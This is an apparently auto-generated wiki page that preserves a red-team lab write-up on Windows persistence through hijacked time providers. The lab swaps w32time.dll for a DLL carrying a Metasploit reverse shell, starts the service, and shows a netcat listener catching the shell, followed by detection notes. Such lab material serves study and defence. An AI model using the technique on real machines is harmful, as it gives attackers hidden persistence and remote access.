---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Hijacking Time Providers

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1209-hijacking-time-providers` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1209-hijacking-time-providers.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Hijacking Time Providers](../../topics/offensive-security/hijacking-time-providers.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1209-hijacking-time-providers |
| name | Hijacking Time Providers |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1209-hijacking-time-providers.md |

## Preserved Source Material

````yaml
_asset_filenames:
- time-ancestry.png
- time-context.png
- time-registry.png
_body: "---\ndescription: Persistence\n---\n\n# Hijacking Time Providers\n\n## Execution\n\nService w32time depends on the\
  \ DLL specified in `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`. \n\nIf an attacker\
  \ can replace the `w32time.dll` with his malicious DLL or modify the DllName value to point to his malicious binary, he\
  \ can get that malicious code executed. \n\nIn this lab, we will just swap out the `w32time.dll` with our own. It contains\
  \ a metasploit reverse shell payload:\n\n![](../../.gitbook/assets/time-registry.png)\n\nStarting the w32time service:\n\
  \n```csharp\nC:\\Users\\mantvydas\\Start Menu\\Programs\\Startup>sc.exe start w32time\n\nSERVICE_NAME: w32time\n       \
  \ TYPE               : 20  WIN32_SHARE_PROCESS\n        STATE              : 2  START_PENDING\n                        \
  \        (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE\
  \  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 964\n\
  \        FLAGS              :\n```\n\nAttacker receiving a reverse shell:\n\n{% code title=\"attacker@local\" %}\n```csharp\n\
  root@~# nc -lvvp 443\nlistening on [any] 443 ...\n10.0.0.2: inverse host lookup failed: Unknown host\nconnect to [10.0.0.5]\
  \ from (UNKNOWN) [10.0.0.2] 64634\n```\n{% endcode %}\n\n## Observations\n\nThe shell is running as a child of svchost which\
  \ is expected as this is where all the services originate from:\n\n![](../../.gitbook/assets/time-ancestry.png)\n\nNote\
  \ that the code is running under the context of `LOCAL SERVICE`:\n\n![](../../.gitbook/assets/time-context.png)\n\nThis\
  \ time and time again shows that binaries running off of svchost.exe, especially if they are rundll32 and are making network\
  \ connections, should be investigated further.\n\n## References\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1209\"\
  \ %}"
_relative_path: offensive-security/persistence/t1209-hijacking-time-providers.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1209-hijacking-time-providers.md
````
